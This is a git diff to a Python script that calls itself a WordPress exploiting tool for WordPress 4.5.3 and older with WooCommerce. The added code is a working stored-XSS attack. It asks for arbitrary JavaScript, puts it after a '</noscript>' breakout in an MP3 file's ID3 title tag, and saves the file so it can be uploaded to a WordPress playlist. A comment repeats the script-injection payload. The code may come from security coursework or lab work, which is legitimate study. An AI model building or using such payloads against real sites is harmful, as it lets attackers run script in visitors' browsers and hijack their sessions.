@@ -1,6 +1,8 @@
 #Wordpress exploiting tool designed by DavideCube
 #Works on Wordpress version <= 4.5.3 and the WooCommerce Plugin version
 from bs4 import BeautifulSoup
+from mutagen.id3 import ID3, TIT2
+import mutagen
 import re
 import urllib.request
 import os
@@ -67,6 +69,10 @@ for i in range(len(my_list)):
 print("\n")
 choice_num = 69
 
+# Titolo spazi </noscript><script>quello chevoglio </script>
+
+
+
 #work on the choices http://10.7.152.98:3000/wordpress
 while not(choice_num == 99):
 	#control the validity of the inserted choice https://www.google.it
@@ -103,7 +109,17 @@ while not(choice_num == 99):
 		print("   ******************************************************************")
 		print("   *                        XSS attack                              *")
 		print("   ******************************************************************") 
-		print(" - In order to ")
+		print(" - This XSS attack exploits the vulnerability in the playlist functionality of wordpress.")
+		print(" - This issue can be exploited by uploading a malicious MP3 file into a wordpress playlist within a file.")
+		print(" - The attacker can put any javascript code inside the meta information of an audio file.")
+		js_code = input("Insert here the javascript code you want to inject: ")
+		title = "Hacking in the deep                                                      </noscript>" + js_code
+
+		audio = ID3("modules/xss.mp3")
+		audio.add(TIT2(encoding=3, text=title))
+		audio.save("modules/xss.mp3")
+
+		print("\n")
 
 
 
@@ -149,8 +165,6 @@ while not(choice_num == 99):
 		print("\n")
 
 	
-
-
 
 
 
